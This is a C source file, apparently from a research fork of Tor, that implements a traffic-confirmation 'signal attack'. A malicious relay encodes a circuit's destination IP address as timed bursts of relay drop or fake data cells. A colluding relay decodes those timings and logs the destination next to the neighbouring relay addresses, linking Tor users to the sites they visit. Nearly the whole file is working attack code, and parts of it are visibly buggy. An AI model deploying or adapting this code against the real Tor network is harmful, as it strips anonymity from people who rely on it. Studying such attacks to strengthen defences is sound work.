#include "or.h"
#define TOR_CHANNEL_INTERNAL_ //get some channel internal function
#include "channel.h"
#include "channeltls.h"
#include "connection.h"
#include "circuitlist.h"
#include "relay.h"
#include "orconfig.h"
#include "config.h"
#include "compat.h"
#include "nodelist.h"
#include "router.h"
#ifdef HAVE_EVENT2_EVENT_H
#include <event2/event.h>
#else
#include <event.h>
#endif
#include <time.h>
#include <unistd.h>
#include <stdio.h>
#define TOR_SIGNAL_ATTACK_PRIVATE
#include "signal_attack.h"
#include "crypto.h"

static int signal_send_relay_drop(int nbr, circuit_t *circ) {
  int random_streamid = 0;
  if (get_options()->FakeDataCell) {
    random_streamid = crypto_rand_int(65536);
  }
  while (nbr > 0) {
    if (get_options()->FakeDataCell) {
      if (relay_send_command_from_edge_(random_streamid, circ,
            RELAY_COMMAND_DATA, NULL, 0,
            NULL, __FILE__, __LINE__) < 0) {
        log_debug(LD_BUG, "Signal not completly sent");
        return -1;
      }
    }
    else {
      if (relay_send_command_from_edge_(0, circ,
                                  RELAY_COMMAND_DROP, NULL, 0,
                                  NULL, __FILE__, __LINE__) < 0) {
        log_debug(LD_BUG, "Signal not completly sent");
        return -1;
      }
    }
    nbr--;
  }

  return 0;
}


// --------------------------_DECODING_ FUNCTIONS----------------------------------

static smartlist_t *circ_timings;

STATIC int signal_compare_signal_decode_(const void **a_, const void **b_) {
  const signal_decode_t *a = *a_;
  const signal_decode_t *b = *b_;
  circid_t circid_a = a->circid;
  circid_t circid_b = b->circid;
  if (circid_a < circid_b)
    return -1;
  else if (circid_a == circid_b)
    return 0;
  else
    return 1;
}

STATIC int signal_compare_key_to_entry_(const void *_key, const void **_member) {
  const circid_t circid = *(circid_t *)_key;
  const signal_decode_t *entry = *_member;
  if (circid < entry->circid)
    return -1;
  else if (circid == entry->circid)
    return 0;
  else
    return 1;
}

STATIC void handle_timing_add(signal_decode_t *circ_timing, struct timespec *now,
    int SignalMethod) {
  switch (SignalMethod) {
    case MIN_BLANK:
      if (smartlist_len(circ_timing->timespec_list) > 255*4) {
        // free the element before the moving operation from del_keeporder
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
      }
      break;
    case BANDWIDTH_EFFICIENT:
      if (smartlist_len(circ_timing->timespec_list) > 32*3+1) {
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
      }
      break;
    case SIMPLE_WATERMARK:
      if (smartlist_len(circ_timing->timespec_list) > 10) {
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list,0);
      }
    default:
      log_info(LD_BUG, "handle_timing_add default case reached. It should not happen");
  }
  smartlist_add(circ_timing->timespec_list, now);
  circ_timing->last = *now;
}


STATIC int delta_timing(struct timespec *t1, struct timespec *t2) {
  const or_options_t *options = get_options();
  double elapsed_ms = (t2->tv_sec-t1->tv_sec)*1000.0 +\
                      (t2->tv_nsec-t1->tv_nsec)*1E-6;
  if (elapsed_ms  > SIGNAL_ATTACK_MAX_BLANK)
    return 2;
  else if (elapsed_ms >= (options->SignalBlankIntervalMS*0.95))
    return 0;
  else if (elapsed_ms >= 0)
    return 1;
  else {
    log_info(LD_SIGNAL, "BUG: delta_timing compute a negative delta");
    return -1;
  }
}

/*
 * return 1 if successfully decoded a signal
 *        0 if saw nothing
 *       -1 if an error happened
 */

//Ugh! the code is ugly. needs refactoring.
STATIC int signal_minimize_blank_latency_decode(signal_decode_t *circ_timing) {
  //count starts at 1 to decode 0 as a 1 relay drop.
  int i;
  int count = 1;
  int subips[4];
  int ipcount = 0;
  /*log_info(LD_GENERAL, "timespec_list size %d\n and smartlist_circ size %d",*/
      /*smartlist_len(circ_timing->timespec_list), smartlist_len(circ_timings));*/
  // we compare i-count with i to compare the timing of the first cell from
  // a serie
  for (i = 1; i < smartlist_len(circ_timing->timespec_list); ++i) {
    switch (delta_timing(smartlist_get(circ_timing->timespec_list, i-count),
          smartlist_get(circ_timing->timespec_list, i))) {
      case 0:
        subips[ipcount] = count;
        count = 1;
        if (ipcount == 3) {
          // we have decoded the signal
          log_info(LD_SIGNAL, "Dest IP : %d.%d.%d.%d",
              subips[0]-2, subips[1]-2, subips[2]-2, subips[3]-2);
          circ_timing->disabled = 1;
          return 1;
        }
        ipcount++;
        /*log_info(LD_SIGNAL, "subips %d got value %d", ipcount-1, subips[ipcount-1]);*/
        break;
      case 1:
        count++;
        if (count > 258) {
          // clean the list until i!
          for (int j = 0; j < i; j++) {
            tor_free(circ_timing->timespec_list->list[j]);
            smartlist_del_keeporder(circ_timing->timespec_list, j);
          }
          log_info(LD_SIGNAL, "count value above the limit, removing packets");
          return 0;
        }
        break;
      case 2:
        // delta timing is above the accepting range, we restart the count to 0
        if (ipcount == 3) {
          // we have decoded the signal
          subips[ipcount] = count;
          log_info(LD_SIGNAL, "Dest IP : %d.%d.%d.%d",
              subips[0]-2, subips[1]-1, subips[2]-2, subips[3]-2);

          // should clean the list and stop listening on this circuit ?
          circ_timing->disabled = 1;
          return 1;
        }
        count = 1;
        break;
      default:
        return -1;
        break;
    }
  }
  return 0;
}


static int signal_decode_simple_watermark(signal_decode_t *circ_timing,
    char *p_addr, char *n_addr) {
  
  if (smartlist_len(circ_timing->timespec_list) == 4) {
    int count = 0;
    if (delta_timing(smartlist_get(circ_timing->timespec_list, 0),
          smartlist_get(circ_timing->timespec_list, 1)) == 1)
      count++;
    if (delta_timing(smartlist_get(circ_timing->timespec_list, 1),
          smartlist_get(circ_timing->timespec_list, 2)) == 1)
      count++;
   
    if (delta_timing(smartlist_get(circ_timing->timespec_list, 2),
          smartlist_get(circ_timing->timespec_list, 3)) == 1)
      count++;
    if (delta_timing(smartlist_get(circ_timing->timespec_list, 0),
          smartlist_get(circ_timing->timespec_list, 2)) == 1)
      count++;

    if (delta_timing(smartlist_get(circ_timing->timespec_list, 1),
          smartlist_get(circ_timing->timespec_list, 3)) == 1)
      count++;
    
    if (count >= 3) {
      log_info(LD_SIGNAL, "Spotted watermark, predecessor: %s, successor: %s", p_addr, n_addr);
    }
    else {
      log_info(LD_SIGNAL, "No watermark count:%d, predecessor: %s, successor: %s", count, p_addr, n_addr);
    }

    return 1;
  }
  else {
    /*
     * used to print the 10 first packets in the inbound direction of each flow for eye-analysis purpose.
     * Then, the circuit decoding is desabled
     * */
    (void) p_addr;
    (void) n_addr;
    if (smartlist_len(circ_timing->timespec_list) == 10)
      circ_timing->disabled = 1;
    return 0;
  }
}

static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing,
    char *p_addr, char *n_addr) {
  /*
   * Works perfectly with chutney BUT
   * Does not work very well in shadow due to noisy network.
   * We need using coding theory 
   * in order to make this method working over a real network
   * */

  
  int i, bit;
  int count = 1;
  int nbr_sub_ip_decoded = 0;
  char subips[4][9];
  for (i = 0; i < 4; i++) {
    subips[i][8] = '\0';
  }
  int nth_bit = 0;
  for (i = 1; i < smartlist_len(circ_timing->timespec_list); i++) {
    switch(delta_timing(smartlist_get(circ_timing->timespec_list, i-count),
        smartlist_get(circ_timing->timespec_list, i))) {
      case 0:
        if (count == 2) 
          bit = 0;
        else if (count == 3)
          bit = 1;
        else {
          // we suppose that after having recorded an entire subip, we indeed have a signal
          // Obviously, this should not happen
          if (nbr_sub_ip_decoded > 0) {
            circ_timing->disabled = 1;
            log_info(LD_SIGNAL, "Signal distorded or no signal, count: %d, predecessor: %s, sucessor: %s",
                count, p_addr, n_addr);
            return 0;
          }
          count = 1;
          continue;
        }
        if (bit & 1)
          subips[nbr_sub_ip_decoded][nth_bit] = '1';
        else
          subips[nbr_sub_ip_decoded][nth_bit] = '0';
        nth_bit++;
        if (nth_bit > 7) {
          // we have decoded a subip
          /*log_info(LD_SIGNAL, "subip ip found:%s",*/
              /*subips[nbr_sub_ip_decoded]);*/
          if (nbr_sub_ip_decoded == 3) {
            log_info(LD_SIGNAL, "Dest IP in binary: %s.%s.%s.%s, predecessor: %s, successor: %s",
                subips[0], subips[1], subips[2], subips[3], p_addr, n_addr);
            circ_timing->disabled = 1;
            return 1;
          }
          nth_bit = 0;
          nbr_sub_ip_decoded++;
        }
        count = 1;
        break;
      case 1:
        count++;
        break;
      case 2:
        if (nbr_sub_ip_decoded == 3 && nth_bit == 7) {
          if (count == 2)
            bit = 0;
          else if (count == 3)
            bit = 1;
          else {
            log_info(LD_SIGNAL, "signal distorded: %s.%s.%s.%s - count %d, predecessor: %s, successor: %s",
                subips[0], subips[1], subips[2], subips[3], count, p_addr, n_addr);
            /*return 0;*/
            continue;
          }
          if (bit & 1)
            subips[nbr_sub_ip_decoded][nth_bit] = '1';
          else
            subips[nbr_sub_ip_decoded][nth_bit] = '0';
          log_info(LD_SIGNAL, "Dest IP in binary: %s.%s.%s.%s, predecessor: %s, successor: %s",
                subips[0], subips[1], subips[2], subips[3], p_addr, n_addr);
          circ_timing->disabled = 1;
          return 1;
        }

        break;
      default:
        return -1;
        break;
    }
  }
  return 0;
}


static circid_t counter = 1;


int signal_listen_and_decode(circuit_t *circ) {
  or_circuit_t *or_circ = NULL;
  if (!circ_timings)
    circ_timings = smartlist_new();
  const or_options_t *options = get_options();
  // add to the smartilist the current time
  //todo
  signal_decode_t *circ_timing;
  circid_t circid = circ->timing_circ_id; //default 0
  struct timespec *now = tor_malloc_zero(sizeof(struct timespec));
  circ_timing = smartlist_bsearch(circ_timings, &circid, 
      signal_compare_key_to_entry_);
  if (!CIRCUIT_IS_ORIGIN(circ))
    or_circ = TO_OR_CIRCUIT(circ);
  tor_addr_t p_tmp_addr, n_tmp_addr;
  char p_addr[TOR_ADDR_BUF_LEN], n_addr[TOR_ADDR_BUF_LEN];
  if (channel_get_addr_if_possible(or_circ->p_chan, &p_tmp_addr)) {
    tor_addr_to_str(p_addr, &p_tmp_addr, TOR_ADDR_BUF_LEN, 0);
  }
  else
    p_addr[0] = '\0';

  clock_gettime(CLOCK_REALTIME, now);
  if (!circ_timing) {
    circ_timing = tor_malloc_zero(sizeof(signal_decode_t));
    circ->timing_circ_id = counter;
    circ_timing->circid = counter++;
    circ_timing->timespec_list = smartlist_new();
    circ_timing->first = *now;
    smartlist_insert_keeporder(circ_timings, circ_timing,
        signal_compare_signal_decode_);
    SMARTLIST_FOREACH(nodelist_get_list(), node_t *, node,
    {
      if (node->ri) {
        if (router_has_addr(node->ri, &p_tmp_addr)) {
          circ_timing->disabled = 1;
        }
      }
    });
  }
  if (circ_timing->disabled){
    tor_free(now);
    return 1;
  }
  /*
   *Check wether the previous node is a relay;
   * */

  circ_timing->last = *now;
  if (channel_get_addr_if_possible(circ->n_chan, &n_tmp_addr)) {
    tor_addr_to_str(n_addr, &n_tmp_addr, TOR_ADDR_BUF_LEN, 0);
  }
  else
    n_addr[0] = '\0';

  /*log_info(LD_SIGNAL, "circid: %u at time %u:%ld, index of timespec: %d, predecessor: %s, successor: %s, purpose: %s",*/
      /*circ_timing->circid, (uint32_t)now->tv_sec, now->tv_nsec, smartlist_len(circ_timing->timespec_list),*/
      /*p_addr, n_addr,*/
      /*circuit_purpose_to_controller_string(circ->purpose));*/
  handle_timing_add(circ_timing, now, options->SignalMethod);
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: return signal_bandwidth_efficient_decode(circ_timing, p_addr, n_addr);
            break;
    case MIN_BLANK: return signal_minimize_blank_latency_decode(circ_timing);
            break;
    case SIMPLE_WATERMARK: return signal_decode_simple_watermark(circ_timing, p_addr, n_addr);
    default:
      log_info(LD_BUG, "signal_listen_and_decode switch: no correct case\n");
      return -1;
  }
  return -1;
}

//--------------------------END _DECODING_ FUNCTION-------------------------------

//-------------------------- _ENCODING_ FUNCTION ---------------------------------
static void address_to_subip(char *address, int *subip) {
  
  char *tmp_subaddress;
  tmp_subaddress = strtok(address, ".");
  int i = 0;
  subip[i++] = atoi(tmp_subaddress);
  while (tmp_subaddress != NULL) {
    tmp_subaddress = strtok(NULL, ".");
    if (tmp_subaddress != NULL) {
      subip[i++] = atoi(tmp_subaddress);
    }
  }
}

STATIC void subip_to_subip_bin(uint8_t subip, char *subip_bin) {
  int k;
  for (int i=7; i>=0; i--) {
    k = subip >> i;
    if (k & 1)
      subip_bin[i] = '1';
    else
      subip_bin[i] = '0';
  }
}


void signal_send_delayed_destroy_cb(evutil_socket_t fd,
    short events, void *arg) {
  circuit_t *circ = arg;
  circ->received_destroy = 1;
  circuit_set_p_circid_chan(TO_OR_CIRCUIT(circ), 0, NULL);
  if (!circ->marked_for_close)
    circuit_mark_for_close(circ, END_CIRC_REASON_FLAG_REMOTE);
}

static void signal_send_one_cell_cb(evutil_socket_t fd,
    short events, void *arg) {
  signal_encode_state_t *state = arg;
  if (!state->circ) {
    log_info(LD_SIGNAL, "Circuit has been freed before the callback. Signal not sent");
    return;
  }
  if (state->circ->marked_for_close) {
    log_info(LD_SIGNAL, "Circuit has been marked for close. Signal not sent");
    return;
  }
  if (signal_send_relay_drop(1, state->circ) < 0) {
    log_info(LD_SIGNAL, "BUG, final cell not send");
  }
  if (!CIRCUIT_IS_ORIGIN(state->circ)) {
    channel_flush_cells(TO_OR_CIRCUIT(state->circ)->p_chan);
    connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(state->circ)->p_chan)->conn));
    /*log_info(LD_SIGNAL, "connection_flush called and returned %d", r); */
  }
  signal_encode_state_free(state);
}

STATIC void signal_bandwidth_efficient_cb(evutil_socket_t fd,
    short events, void *arg) {

  signal_encode_state_t *state = arg;
  if (!state->circ) {
    log_info(LD_SIGNAL, "Circuit has been freed before the callback. Signal not sent");
    return;
  }
  if (state->circ->marked_for_close) {
    log_info(LD_SIGNAL, "Circuit has been marked for close. Signal not sent");
    return;
  }

  char subip_bin[8];
  subip_to_subip_bin((uint8_t) state->subip[state->nb_calls/8], subip_bin);
  // compute the right index of the bit to send
  int idx = 7 - (state->nb_calls - 8*(state->nb_calls/8));
  struct timeval timeout =  {0, get_options()->SignalBlankIntervalMS*1E3};
  struct timespec now;
  clock_gettime(CLOCK_REALTIME, &now);
  log_info(LD_SIGNAL, "Callback called at time %u:%ld", (int)now.tv_sec, now.tv_nsec);
  if (subip_bin[idx] == '0') {
    if (signal_send_relay_drop(2, state->circ) < 0) {
      log_info(LD_SIGNAL, "BUG: signal_send_relay_drop returned -1 on a 0 bit sending");
    }
  }
  else if (subip_bin[idx] == '1') {
    if (signal_send_relay_drop(3, state->circ) < 0) {
      log_info(LD_SIGNAL, "BUG: signal_send_relay_drop_returned -1 on 1 bit sending");
    }
  }
  else {
    log_info(LD_SIGNAL, "BUG: something went wrong with subip_bin: %s", subip_bin);
  }
  if (!CIRCUIT_IS_ORIGIN(state->circ)) {
    channel_flush_cells(TO_OR_CIRCUIT(state->circ)->p_chan);
    connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(state->circ)->p_chan)->conn));
    /*log_info(LD_SIGNAL, "connection_flush called and returned %d", r); */
  }
  if (state->nb_calls < 31) {
    state->nb_calls++;
    evtimer_add(state->ev, &timeout);
  }
  else {
    struct timeval timeout = {1, 0};
    struct event *ev;
    ev = tor_evtimer_new(tor_libevent_get_base(),
        signal_send_one_cell_cb, state);
    evtimer_add(ev, &timeout);
  }
}

STATIC int signal_bandwidth_efficient(char *address, circuit_t *circ) {
  signal_encode_state_t *state = tor_malloc_zero(sizeof(signal_encode_state_t));
  state->circ = circ;
  int subip[4];
  address_to_subip(address, subip);
  for (int i = 0; i < 4; i++) {
    state->subip[i] = subip[i];
  }
  state->address = tor_strdup(address);
  struct timeval init = {get_options()->SignalLaunchDelay, 0};
  struct event *ev;
  ev = tor_evtimer_new(tor_libevent_get_base(),
           signal_bandwidth_efficient_cb, state);
  state->ev = ev;
  evtimer_add(ev, &init);
  return 0;
}


STATIC void signal_minimize_blank_latency_cb(evutil_socket_t fd,
    short events, void *arg) {
  signal_encode_state_t *state = arg;
  struct timeval timeout =  {0, get_options()->SignalBlankIntervalMS*1E3};
  struct timespec *now = tor_malloc_zero(sizeof(struct timespec));
  clock_gettime(CLOCK_REALTIME, now);
  log_info(LD_SIGNAL, "Callback called at time %u:%ld", (int)now->tv_sec, now->tv_nsec);
  tor_free(now);
  if (signal_send_relay_drop(state->subip[state->nb_calls]+2, state->circ) < 0) {
    // forward an error TODO
  }
  if (!CIRCUIT_IS_ORIGIN(state->circ)) {
    channel_flush_cells(TO_OR_CIRCUIT(state->circ)->p_chan);
    int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(state->circ)->p_chan)->conn));
    log_info(LD_SIGNAL, "connection_flush called and returned %d", r);
  }
  if (state->nb_calls < 3) {
    state->nb_calls++;
    evtimer_add(state->ev, &timeout);
  }
  else {
    signal_encode_state_free(state);
  }
}



STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
  /*struct timespec time, rem;*/
  /*const or_options_t *options = get_options();*/
  /*time.tv_sec = 0;*/
  /*time.tv_nsec = options->SignalBlankIntervalMS*1E6;*/
  int i;
  int subip[4];
  address_to_subip(address, subip);
  /*or_circuit_t *or_circ = TO_OR_CIRCUIT(circ);*/
  signal_encode_state_t *state = tor_malloc_zero(sizeof(signal_encode_state_t));
  state->circ = circ;
  for (i = 0; i < 4; i++) {
    state->subip[i] = subip[i];
  }
  state->address = tor_strdup(address);
  struct timeval init = {2, 0};
  struct event *ev;
  ev = tor_evtimer_new(tor_libevent_get_base(),
           signal_minimize_blank_latency_cb, state);
  state->ev = ev;
  evtimer_add(ev, &init);

  /*for (i = 0; i < 4; i++) {*/
    /*if (signal_send_relay_drop(subip[i]+2, circ) < 0) { //offset 1 for encoding 0.*/
      /*return -1;*/
    /*}*/
    /*sleep(1); //sleep 1second*/
    // flush data before sleeping
    /*if (!CIRCUIT_IS_ORIGIN(circ)) {*/
      //update_circuit_on_cmux(circ, CELL_DIRECTION_IN);
      /*channel_flush_cells(or_circ->p_chan);*/
      /*int r = connection_flush(TO_CONN(BASE_CHAN_TO_TLS(or_circ->p_chan)->conn));*/
      /*log_info(LD_SIGNAL, "connection_flush called and returned %d", r); */
    /*}*/
    /*else {*/
      /*log_info(LD_SIGNAL, "We should handle origin circuit at some points. e.g. signal attacks performed from an onion service");*/
    /*}*/
    /*if (nanosleep(&time, &rem) < 0) {*/
      /*log_info(LD_SIGNAL, "BUG: nanosleep call failed\n");*/
      /*return -1;*/
    /*}*/
  /*}*/
  return 0;
}

STATIC void signal_encode_simple_watermark(circuit_t *circ) {
  // Just send right now 3 RD cells

  
  if (signal_send_relay_drop(3, circ) < 0) {
    // forward an error or only log ?
    log_info(LD_SIGNAL, "signal_send_relay_drop returned -1 when sending the watermark");
  }
  if (!CIRCUIT_IS_ORIGIN(circ)) {
    channel_flush_cells(TO_OR_CIRCUIT(circ)->p_chan);
    connection_flush(TO_CONN(BASE_CHAN_TO_TLS(TO_OR_CIRCUIT(circ)->p_chan)->conn));
    //log_info(LD_SIGNAL, "connection_flush called and returned %d", r);
  }
}

void signal_encode_destination(void *p) {
  struct signal_encode_param_t *param = p;
  char *address = param->address;
  //param->address is freed by the caller
  circuit_t *circ = param->circ;
  const or_options_t *options = get_options();
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: signal_bandwidth_efficient(address, circ);
            break;
    case MIN_BLANK: signal_minimize_blank_latency(address, circ);
            break;
    case SIMPLE_WATERMARK: signal_encode_simple_watermark(circ);
            break;
  }
}

//-------------------------------- CLEAN UP --------------------------------


void signal_free(circuit_t *circ) {
  if (!circ_timings)
    return;
  circid_t circid = circ->n_circ_id;
  int found;
  int idx = smartlist_bsearch_idx(circ_timings, &circid,
          signal_compare_key_to_entry_, &found);
  if (found) {
    smartlist_free(((signal_decode_t *)smartlist_get(circ_timings, idx))->timespec_list);
    tor_free(circ_timings->list[idx]);
    smartlist_del_keeporder(circ_timings, idx);
  }
}
void signal_encode_state_free(signal_encode_state_t *state) {
    tor_event_free(state->ev);
    tor_free(state->address);
    tor_free(state);
}
